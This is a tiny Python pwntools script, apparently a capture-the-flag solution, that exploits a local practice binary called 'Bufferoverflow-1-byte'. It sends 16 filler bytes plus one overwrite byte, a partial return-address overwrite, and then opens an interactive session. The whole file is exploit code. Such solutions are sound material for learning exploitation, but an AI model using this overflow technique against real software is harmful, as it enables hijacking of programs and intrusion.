from pwn import*

p = process("./Bufferoverflow-1-byte")

payload = b"a"*16 + b"\x8b"

p.sendline(payload)
p.interactive()
